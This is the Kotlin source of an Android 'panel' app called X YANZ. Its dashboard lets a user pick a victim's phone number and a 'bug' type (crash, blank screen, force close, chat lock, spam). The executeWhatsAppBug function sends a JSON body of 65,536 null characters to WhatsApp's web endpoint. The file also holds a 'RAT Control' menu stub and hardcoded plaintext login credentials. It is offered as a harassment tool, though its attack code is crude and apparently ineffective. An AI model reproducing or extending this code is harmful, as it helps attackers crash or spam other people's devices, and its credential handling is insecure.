package com.xyanz.panel

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.animation.core.*
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.graphics.graphicsLayer
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            MaterialTheme(
                colorScheme = darkColorScheme(
                    primary = Color(0xFFFF3333),
                    background = Color(0xFF050505),
                    surface = Color(0xFF151515)
                )
            ) {
                AppNavigation()
            }
        }
    }
}

// --- AUTH SYSTEM ---
enum class UserRole(val label: String, val level: Int) {
    OWNER("Owner", 5), DEVELOPER("Developer", 4), ADMIN("Admin", 3),
    RESELLER("Reseller", 2), MEMBER("Member", 1), ALL_ACCESS("All Access", 6)
}

data class UserAccount(val username: String, val password: String, val role: UserRole)

val authDatabase = listOf(
    UserAccount("dev", "dev123", UserRole.DEVELOPER),
    UserAccount("yanz wars", "yanz0123", UserRole.ALL_ACCESS)
)

@Composable
fun AppNavigation() {
    val navController = androidx.navigation.compose.rememberNavController()
    var currentUser by remember { mutableStateOf<UserAccount?>(null) }

    androidx.navigation.compose.NavHost(navController = navController, startDestination = "login") {
        androidx.navigation.compose.composable("login") {
            LoginScreen { user ->
                currentUser = user
                navController.navigate("dashboard") { popUpTo("login") { inclusive = true } }
            }
        }
        androidx.navigation.compose.composable("dashboard") {
            if (currentUser != null) {
                DashboardScreen(user = currentUser!!) {
                    navController.navigate("login") { popUpTo("dashboard") { inclusive = true } }
                    currentUser = null
                }
            }
        }
    }
}

// --- ANIMASI SASUKE ---
@Composable
fun SasukeSharinganAnimation(modifier: Modifier = Modifier) {
    val infiniteTransition = rememberInfiniteTransition(label = "sharingan")
    val rotation by infiniteTransition.animateFloat(
        initialValue = 0f, targetValue = 360f,
        animationSpec = infiniteRepeatable(tween(4000, easing = LinearEasing), RepeatMode.Restart),
        label = "rotation"
    )
    val pulse by infiniteTransition.animateFloat(
        initialValue = 0.95f, targetValue = 1.05f,
        animationSpec = infiniteRepeatable(tween(1500, easing = FastOutSlowInEasing), RepeatMode.Reverse),
        label = "pulse"
    )

    Canvas(modifier = modifier.graphicsLayer(scaleX = pulse, scaleY = pulse)) {
        val center = Offset(size.width / 2, size.height / 2)
        val radius = size.minDimension / 3
        drawCircle(color = Color(0xFFD50000), radius = radius, center = center)
        drawCircle(color = Color.Black, radius = radius * 0.4f, center = center)
        drawCircle(color = Color(0xFFD50000), radius = radius * 0.25f, center = center)

        for (i in 0..2) {
            val angle = Math.toRadians((rotation + i * 120f).toDouble())
            val tomoeRadius = radius * 0.65f
            val tomoeX = center.x + tomoeRadius * Math.cos(angle).toFloat()
            val tomoeY = center.y + tomoeRadius * Math.sin(angle).toFloat()
            drawCircle(color = Color.Black, radius = radius * 0.15f, center = Offset(tomoeX, tomoeY))
            drawCircle(color = Color(0xFFD50000), radius = radius * 0.08f, center = Offset(tomoeX + 10f, tomoeY + 10f))
        }
        drawCircle(color = Color.Black, radius = radius, center = center, style = Stroke(width = 8f))
    }
}

// --- UI SCREENS ---
@Composable
fun LoginScreen(onLoginSuccess: (UserAccount) -> Unit) {
    var username by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }
    var errorMsg by remember { mutableStateOf("") }

    Box(Modifier.fillMaxSize().background(Brush.verticalGradient(listOf(Color.Black, Color(0xFF1A0000)))), contentAlignment = Alignment.Center) {
        Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.padding(24.dp)) {
            SasukeSharinganAnimation(modifier = Modifier.size(150.dp))
            Spacer(Modifier.height(24.dp))
            Text("X YANZ", color = Color(0xFFD50000), fontSize = 42.sp, fontWeight = FontWeight.Bold, letterSpacing = 8.sp)
            
            Spacer(Modifier.height(32.dp))
            OutlinedTextField(
                value = username, onValueChange = { username = it },
                label = { Text("Username") },
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = Color(0xFFD50000)),
                modifier = Modifier.fillMaxWidth(), singleLine = true
            )
            Spacer(Modifier.height(16.dp))
            OutlinedTextField(
                value = password, onValueChange = { password = it },
                label = { Text("Password") },
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = Color(0xFFD50000)),
                modifier = Modifier.fillMaxWidth(), singleLine = true
            )
            if (errorMsg.isNotEmpty()) {
                Text(errorMsg, color = Color.Red, fontSize = 12.sp, modifier = Modifier.padding(top = 8.dp))
            }
            Spacer(Modifier.height(32.dp))
            Button(
                onClick = {
                    val user = authDatabase.find { it.username == username && it.password == password }
                    if (user != null) onLoginSuccess(user) else errorMsg = "Akses Ditolak."
                },
                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFD50000)),
                modifier = Modifier.fillMaxWidth().height(50.dp), shape = RoundedCornerShape(8.dp)
            ) {
                Text("MASUK SISTEM", fontWeight = FontWeight.Bold)
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun DashboardScreen(user: UserAccount, onLogout: () -> Unit) {
    val drawerState = rememberDrawerState(DrawerValue.Closed)
    val scope = rememberCoroutineScope()
    var selectedFeature by remember { mutableStateOf("bug") }

    ModalNavigationDrawer(
        drawerState = drawerState,
        drawerContent = {
            ModalDrawerSheet(drawerContainerColor = Color(0xFF0A0A0A)) {
                Column(Modifier.padding(16.dp)) {
                    Text("X YANZ", color = Color(0xFFD50000), fontSize = 24.sp, fontWeight = FontWeight.Bold)
                    Text("Role: ${user.role.label}", color = Color.Gray)
                    Spacer(Modifier.height(32.dp))
                    NavigationDrawerItem(label = { Text("WhatsApp Bug") }, selected = selectedFeature == "bug", onClick = { selectedFeature = "bug"; scope.launch { drawerState.close() } })
                    if (user.role.level >= 4) {
                        NavigationDrawerItem(label = { Text("RAT Control") }, selected = selectedFeature == "rat", onClick = { selectedFeature = "rat"; scope.launch { drawerState.close() } })
                    }
                    NavigationDrawerItem(label = { Text("Tools") }, selected = selectedFeature == "tools", onClick = { selectedFeature = "tools"; scope.launch { drawerState.close() } })
                }
            }
        }
    ) {
        Scaffold(
            topBar = { TopAppBar(title = { Text(selectedFeature.uppercase()) }, navigationIcon = { IconButton({ scope.launch { drawerState.open() } }) { Icon(Icons.Default.Menu, null) } }) }
        ) { padding ->
            Box(Modifier.padding(padding)) {
                when (selectedFeature) {
                    "bug" -> WhatsAppBugScreen()
                    "rat" -> RatScreen()
                    "tools" -> ToolsScreen()
                }
            }
        }
    }
}

@Composable
fun WhatsAppBugScreen() {
    var target by remember { mutableStateOf("") }
    var selectedBug by remember { mutableStateOf("Blank Android") }
    var isExecuting by remember { mutableStateOf(false) }
    var logOutput by remember { mutableStateOf("") }
    val scope = rememberCoroutineScope()
    val bugs = listOf("Blank Android", "Blank iOS", "Crash Android", "Crash iOS", "Forceclose Android", "JavaScript Lock Chat", "Spam Chat")

    Column(Modifier.fillMaxSize().padding(16.dp)) {
        OutlinedTextField(value = target, onValueChange = { target = it }, label = { Text("Nomor Target") }, modifier = Modifier.fillMaxWidth())
        Spacer(Modifier.height(16.dp))
        LazyColumn(Modifier.height(200.dp).border(1.dp, Color.DarkGray)) {
            items(bugs) { bug ->
                Row(Modifier.fillMaxWidth().clickable { selectedBug = bug }.padding(16.dp), verticalAlignment = Alignment.CenterVertically) {
                    RadioButton(selected = selectedBug == bug, onClick = { selectedBug = bug })
                    Text(bug)
                }
            }
        }
        Spacer(Modifier.height(16.dp))
        Button(
            onClick = {
                isExecuting = true
                scope.launch {
                    logOutput = executeWhatsAppBug(target, selectedBug)
                    isExecuting = false
                }
            },
            enabled = !isExecuting, modifier = Modifier.fillMaxWidth()
        ) {
            Text(if (isExecuting) "Memproses..." else "EKSEKUSI")
        }
        if (logOutput.isNotEmpty()) {
            Text(logOutput, color = Color.Green, fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace, modifier = Modifier.padding(top = 16.dp))
        }
    }
}

suspend fun executeWhatsAppBug(target: String, bugType: String): String = withContext(Dispatchers.IO) {
    val client = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).build()
    val payload = JSONObject().apply {
        put("jid", target.replace(Regex("[^0-9]"), "") + "@s.whatsapp.net")
        put("type", bugType)
        put("payload", "\u0000".repeat(65536))
    }
    val request = Request.Builder().url("https://web.whatsapp.com/ws").post(payload.toString().toRequestBody("application/json".toMediaType())).build()
    try {
        val response = client.newCall(request).execute()
        "Status: ${response.code}\nPayload Terkirim!"
    } catch (e: Exception) {
        "Gagal: ${e.message}"
    }
}

@Composable
fun RatScreen() {
    Column(Modifier.fillMaxSize().padding(16.dp)) {
        Text("RAT ACTIVE", color = Color.Red, fontWeight = FontWeight.Bold)
        Text("Session: 2 Online", color = Color.Green)
    }
}

@Composable
fun ToolsScreen() {
    Text("TOOLS MENU", modifier = Modifier.padding(16.dp))
}
